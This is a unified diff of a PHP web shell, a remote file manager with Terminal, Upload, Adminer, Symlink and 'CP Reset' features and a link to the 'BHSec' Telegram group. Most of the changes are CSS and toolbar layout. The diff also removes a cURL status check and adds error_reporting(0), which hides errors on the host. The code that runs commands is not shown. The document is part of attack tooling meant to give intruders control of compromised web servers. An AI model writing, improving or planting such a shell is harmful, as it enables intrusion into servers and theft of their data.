@@ -1,5 +1,6 @@
 <?php
 date_default_timezone_set("Asia/Jakarta");
+error_reporting(0);
 session_start();
 set_time_limit(0);
 $password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
@@ -134,18 +135,24 @@ if (!isset($_SESSION['login'])) {
     div.center {
         background: #fff;
         overflow: hidden;
-        max-height:560px;
+        height:500px;
         border-radius:0px 0px 5px 0px;
         padding-right: 40px;
         padding-top: 10px;
+        padding-left:35px;
     }
     div.tool {
-        overflow: auto;
         background: #fff;
-        max-height:560px;
-        border-radius:0px 0px 0px 5px;
-        width:100%;
-        padding:0px;
+        padding-left:12px;
+        width: 50px;
+    }
+    div.intotool {
+        overflow-x: auto;
+        width:97.8%;
+    }
+    div.intool {
+        width: 200%;
+        padding: 11px;
     }
     div.tool a.logout {
         background:#dc3545;
@@ -156,12 +163,11 @@ if (!isset($_SESSION['login'])) {
     }
     div.tool a {
         z-index: 0;
-        overflow: auto;
         background: var(--color-bg);
         border: 1px solid #f2f2f2;
         margin:10px;
         font-weight: bold;
-        display: block;
+        display: inline;
         color: #1889f5;
         border-radius:5px;
         padding: 10px;
@@ -279,6 +285,9 @@ if (!isset($_SESSION['login'])) {
     div.make {
         width:100%;
     }
+    div.edit {
+        height: 423px;
+    }
     div.createfile,
     div.upload,
     div.chname,
@@ -299,14 +308,15 @@ if (!isset($_SESSION['login'])) {
         overflow: hidden;
     }
     div.infos {
-        height:490px;
+        height:422px;
         overflow: auto;
     }
     div.cs {
-        border-radius:0px;
+        border-radius:0px 0px 0px 5px;
     }
     div.filemanager {
         padding:10px;
+        padding-left:20px;
         padding-bottom: 2px;
     }
     div.files {
@@ -320,7 +330,7 @@ if (!isset($_SESSION['login'])) {
         box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
     }
     div.infiles {
-        max-height:454px;
+        height:385px;
         overflow: auto;
     }
     .count,
@@ -378,7 +388,7 @@ if (!isset($_SESSION['login'])) {
         padding:20px;
         resize: none;
         width: 100%;
-        height:210px;
+        height:160px;
         border-radius:5px;
     }
     td.action {
@@ -445,13 +455,14 @@ if (!isset($_SESSION['login'])) {
         padding:3px;
     }
     ::-webkit-scrollbar {
-        width: 10px;
+        display: none;
     }
     ::-webkit-scrollbar-track {
+        background: blue;
     }
     ::-webkit-scrollbar-thumb {
         background: var(--color-bg);
-        border-radius:3px;
+        border-radius:0;
     }
     ::-webkit-scrollbar-thumb:hover {
         background: #dfeaf5;
@@ -614,13 +625,13 @@ if (!isset($_SESSION['login'])) {
     .navbar .icon {
         display: none;
      }
-     .blocker {
-  position: fixed;
-  top: 0; right: 0; bottom: 0; left: 0;
-  width: 100%; height: 100%;
-  overflow: auto;
-  z-index: 1;
-  padding: 20px;
+    .blocker {
+        position: fixed;
+        top: 0; right: 0; bottom: 0; left: 0;
+        width: 100%; height: 100%;
+        overflow: auto;
+        z-index: 1;
+        padding: 20px;
   box-sizing: border-box;
   text-align: center;
 }
@@ -768,10 +779,10 @@ if (!isset($_SESSION['login'])) {
             display: block;
         }
         div.container {
-            margin: -7.5;
-            width:121%;
+            margin: -20;
+            width:130%;
         }
-        div.tool, .size, .perms {
+        .size, .perms {
             display: none;
         }
         td.act {
@@ -790,7 +801,6 @@ if (!isset($_SESSION['login'])) {
             padding-top: 5px;
             position: center;
             box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
-            width:84.3%;
             border-radius: 5px;
             background: #fff;
         }
@@ -953,6 +963,74 @@ function myFunction() {
             </div>
         </div>
     </div>
+    <div class="row">
+        <div class="col-xs-12 tool">
+            <div class="intotool">
+                <div class="intool">
+                <a href="?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>">
+                <i class="fa fa-home" aria-hidden="true"></i>
+                <span>Home</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&terminal">
+                <i class="fa fa-terminal" aria-hidden="true"></i>
+                <span>Terminal</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&addfiles">
+                <i class="fa fa-plus-square" aria-hidden="true"></i>
+                <span>Add File</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&addfolder">
+                <i class="fa fa-folder" aria-hidden="true"></i>
+                <span>Add Folder</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&upload">
+                <i class="fa fa-upload"></i>
+                <span>Upload</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&config">
+                <i class="fa fa-cogs"></i>
+                <span>Config</span>
+            </a>
+            <a href="?cd=<?= x::hex(x::cwd()) ?>&adminer">
+                <i class="fa fa-user"></i>
+                <span>Adminer</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+                <i class="fa fa-exclamation-triangle"></i>
+                <span>Jumping</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+                <i class="fa fa-exclamation-circle"></i>
+                <span>Symlink</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+                <i class="fas fa-network-wired"></i>
+                <span>Network</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+                <i class="fa fa-exclamation-triangle"></i>
+                <span>Replace</span>
+            </a>
+            <a href="https://t.me/BHSec" target="_blank">
+                <i class="fa fa-users" aria-hidden="true"></i>
+                <span>Join Us</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+                <i class="fa fa-bug" aria-hidden="true"></i>
+                <span>CP Reset</span>
+            </a>
+            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+                <i class="fa fa-info"></i>
+                <span>About me</span>
+            </a>
+            <a href="?logout" class="logout">
+                <i class="fa fa-power-off" aria-hidden="true"></i>
+                <span>Logout</span>
+            </a>
+            </div>
+            </div>
+        </div>
+    </div>
     <?php
     class x {
         public static $cwd;
@@ -1111,7 +1189,7 @@ function myFunction() {
             }
         }
         public static function formatSize( $bytes ){
-            $types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
+            $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
             for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
             return( round( $bytes, 2 )." ".$types[$i] );
         }
@@ -1119,8 +1197,8 @@ function myFunction() {
             self::$path = basename($filename);
             switch ($name) {
                 case '1':
-                    if (strlen(self::$path) > 30) {
-                        print(substr(self::$path, 0, 30)."...");
+                    if (strlen(self::$path) > 40) {
+                        print(substr(self::$path, 0, 40)."...");
                     } else {
                         print(self::$path);
                     }
@@ -1138,7 +1216,7 @@ function myFunction() {
             switch ($info) {
                 case 'hdd':
                     return "Total : ". self::formatSize(disk_total_space(getcwd())) ." &nbsp;&nbsp;<br>
-                            Free  : ".self::formatSize(disk_free_space(getcwd())) ."&nbsp;&nbsp;<br>
+                            Free  : ". self::formatSize(disk_free_space(getcwd())) ."&nbsp;&nbsp;<br>
                             Persentase : [ ".(int) (disk_free_space(getcwd())/disk_total_space(getcwd())*100)."% ]";
                     break;
                 case 'disable_function':
@@ -1146,9 +1224,6 @@ function myFunction() {
                     break;
                 case 'mail':
                     return (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
-                    break;
-                case 'curl':
-                    return (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
                     break;
                 case 'mysql':
                     return (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
@@ -1446,7 +1521,7 @@ function myFunction() {
                     $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
                 }
                 $filesize = filesize($filepath);
-                $array = array("TB","GB","MB","KB","B");
+                $array = array("TB","GB","MB","KB","Byte");
                 $total = count($array);
                 while ($total-- && $filesize > 1024) {
                     $filesize /= 1024;
@@ -1487,11 +1562,6 @@ function myFunction() {
                         <td><?= x::info("mysql") ?></td>
                     </tr>
                     <tr>
-                        <td>cURL</td>
-                        <td>:</td>
-                        <td><?= x::info("curl") ?></td>
-                    </tr>
-                    <tr>
                         <td>Mail</td>
                         <td>:</td>
                         <td><?= x::info("mail") ?></td>
@@ -1514,69 +1584,7 @@ function myFunction() {
     $_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
     ?>
     <div class="row">
-        <div class="col-xs-2 tool">
-            <a href="?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>">
-                <i class="fa fa-home" aria-hidden="true"></i>
-                <span>Home</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&terminal">
-                <i class="fa fa-terminal" aria-hidden="true"></i>
-                <span>Terminal</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&addfiles">
-                <i class="fa fa-plus-square" aria-hidden="true"></i>
-                <span>Add File</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&addfolder">
-                <i class="fa fa-folder" aria-hidden="true"></i>
-                <span>Add Folder</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&upload">
-                <i class="fa fa-upload"></i>
-                <span>Upload</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&config">
-                <i class="fa fa-cogs"></i>
-                <span>Config</span>
-            </a>
-            <a href="?cd=<?= x::hex(x::cwd()) ?>&adminer">
-                <i class="fa fa-user"></i>
-                <span>Adminer</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-exclamation-triangle"></i>
-                <span>Jumping</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-exclamation-circle"></i>
-                <span>Symlink</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fas fa-network-wired"></i>
-                <span>Network</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-exclamation-triangle"></i>
-                <span>Replace</span>
-            </a>
-            <a href="https://t.me/BHSec" target="_blank">
-                <i class="fa fa-users" aria-hidden="true"></i>
-                <span>Join Us</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-bug" aria-hidden="true"></i>
-                <span>CP Reset</span>
-            </a>
-            <a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
-                <i class="fa fa-info"></i>
-                <span>About me</span>
-            </a>
-            <a href="?logout" class="logout">
-                <i class="fa fa-power-off" aria-hidden="true"></i>
-                <span>Logout</span>
-            </a>
-        </div>
-        <div class="col-xs-5 center cs">
+        <div class="col-xs-6 center cs">
             <?php
             if (!empty($data = @$_POST['filename'])) {
                 foreach ($data as $key => $filename) {
@@ -1837,7 +1845,7 @@ function myFunction() {
                             </table>
                         </div>
                     </form>
-                    <br>
+                    <br><br>
                     <?php
                     break;
                 }
@@ -1855,6 +1863,7 @@ function myFunction() {
                 <table width="100%">
                 <?php
                 foreach (x::files('dir') as $dir) {
+                    $rp = str_replace($search , '', basename($dir['name']));
                     $dirs = basename($dir['name']);
                     if (strlen($dirs) > 29){
                         $_dir = substr($dirs, 0, 29)."...";
@@ -1987,7 +1996,7 @@ function myFunction() {
         </div>
     </div>
 </div>
-<div class="col-xs-5 center">
+<div class="col-xs-6 center">
     <?php
     if (isset($_GET['addfolder'])) {
         if (isset($_POST['submit'])) {
